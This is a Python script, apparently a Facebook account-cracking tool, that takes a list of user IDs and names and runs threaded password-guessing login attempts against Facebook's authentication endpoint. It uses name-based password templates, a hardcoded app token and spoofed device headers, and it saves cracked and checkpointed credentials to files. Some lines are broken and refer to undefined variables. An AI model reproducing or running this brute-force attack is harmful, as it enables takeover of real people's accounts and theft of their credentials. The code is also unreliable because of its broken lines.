import os
import sys
import time
import uuid
import json
import random
import requests
from os import system as cmd
from requests.exceptions import ConnectionError as net_error
from concurrent.futures import ThreadPoolExecutor as speed_x

e = "\033[0m"
r = "\033[1;31m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
p = "\033[1;35m"
c = "\033[1;36m"
w = "\033[1;37m"

print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')

print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')

print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')


print('\x1b[1;92m[√] PLEASE WAIT CHECKING UPDATE...')

loop = 0
idz = []
oks = []
cps = []

def oo(text):
    return f"{w}[{g}{text}{w}]"

def logo():
    cmd("clear")
    print(banner)

def linex():
    print(f"{w}═══════════════════════════════════════════════")

def main():
    logo()
    print(f" {oo('1')} File Crack ")
    print(f" {oo('2')} Contact Admin ")
    print(f" {oo('3')} Exit Tool ")
    linex()
    x = input(f" {oo('?')} Select : ")
    if x == "1":
        start()
    elif x == "2":
        os.system("https://wa.me/+923402135201")
        main()
    elif x == "3":
        linex()
        print(f" {oo('!')} {g}Thanks For Using Tool ")
        linex()
        exit()
    else:
        linex()
        print(f" {oo('!')} {g}Select Valid Option ")
        linex()
        time.sleep(1)
        main()

def start():
    logo()
    print(f" {oo('•')} Example : {g}/sdcard/file.txt ")
    linex()
    try:
        file_path = input(f" {oo('?')} File Path : ")
        for x in open(file_path, "r").readlines():
            idz.append(x.strip())
    except Exception:
        linex()
        print(f" {oo('!')} File Not Found >> {g}{file_path} ")
        linex()
        time.sleep(1)
        main()
    logo()
    try:
        ps_limit = int(input(f" {oo('?')} Enter Password Limit : "))
    except ValueError:
        ps_limit = 5
    logo()
    print(f" {oo('•')} Example : {g}first123, first1234, first12345 ")
    linex()
    ps_list = []
    for x in range(ps_limit):
        ps_ask = input(f" {oo(x+1)} Enter Password : ")
        ps_list.append(ps_ask)
    with speed_x(max_workers=30) as kazim:
        logo()
        total_idz = str(len(idz))
        print(f" {oo('•')} Total Accounts : {g}{total_idz} ")
        print(f" {oo('!')} Brute Has Been Started ")
        print(f" {oo('!')} {r}Use Flight Mode For Speed Up ")
        linex()
        for x in idz:
            uid, name = x.split("|")
            pww = ps_list
            kazim.submit(cracker, uid, name, pww, total_idz)
    linex()
    print(f" {oo('•')} Process Completed ")
    print(f" {oo('•')} Total Ok Accounts : {g}{str(len(oks))} ")
    print(f" {oo('•')} Total Cp Accounts : {r}{str(len(cps))} ")
    linex()
    input(f" {oo('!')} Press enter to back ")
    exit()

def cracker(uid, name, pww, total_idz):
    global loop
    global oks
    global cps
    sys.stdout.write(f"\r {w}[Running] [{loop}/{total_idz}] [{len(oks)}/{len(cps)}]\r"),
    sys.stdout.flush()
    try:
        first = name.split(" ")[0]
        try:
            last = name.split(" ")[1]
        except:
            last = first
        for pw in pww:
            ps = pw.replace("first", first).replace("last", last).replace("name", name).lower()
            ua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
            
            
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': ps,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
            }
            headers = {
                'authority': 'm.facebook.com',
                'accept': '*/*',
                'accept-language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
                'content-type': 'multipart/form-data; boundary=----WebKitFormBoundarykyAshm2bCeq47Eae',
                'dpr': '3.8375',
                'origin': 'https://m.facebook.com',
                'sec-ch-prefers-color-scheme': 'light',
                'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
                'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.240"',
                'sec-ch-ua-mobile': '?1',
                'sec-ch-ua-model': '"706SH"',
                'sec-ch-ua-platform': '"Android"',
                'sec-ch-ua-platform-version': '"10.0.0"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
                'viewport-width': '376',
                'x-asbd-id': '129477',
                'x-fb-lsd': 'AVoJV3Anll0',
                'x_fb_background_state': '1',
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            url = "https://b-graph.facebook.com/auth/login"
            lo = session.post('https://m.facebook.com/?rtime=1699999551&hrc=1&wtsid=rdr_0vUHYzUFHuYBpt7OS&refsrc=deprecated&_rdr',data=log_data,headers=header_freefb).text
            result = requests.post(url, data=data, headers=headers).json()
            if "session_key" in result:
                print(f" {g}[KAZIM-OK] {uid}|{ps}")
                open("/sdcard/Kazim-Ok.txt", "a").write(f"{uid}|{ps}")
                oks.append(uid)
                break
            elif "www.facebook.com" in result["error"]["message"]:
                print(f" {r}[KAZIM-CP] {uid}|{ps}")
                open("/sdcard/Kazim-Cp.txt", "a").write(f"{uid}|{ps}")
                cps.append(uid)
                break
            else:
                continue
        loop+=1
    except net_error:
        time.sleep(10)
    except:
        pass

banner = f"""{w}\

   ###     ######  ##     ##    ###    ######## 
  ## ##   ##    ## ###   ###   ## ##      ##    
 ##   ##  ##       #### ####  ##   ##     ##    
##     ##  ######  ## ### ## ##     ##    ##    
#########       ## ##     ## #########    ##    
##     ## ##    ## ##     ## ##     ##    ##    
##     ##  ######  ##     ## ##     ##    ##    

{w}═══════════════════════════════════════════════
{oo('•')} {g}OWNER  :  ASMAT
{oo('•')} {g}FACEBOOK : ASMAT
{oo('•')} {g}GITHUB : Asmatkhan009911
{oo('•')} {g}YOUTUBE : Asmat YT
{oo('•')} {g}TOOL STATUS : FREE TRIAL
{oo('•')} {g}VERSION : 0.1
{w}═══════════════════════════════════════════════\
"""

main()
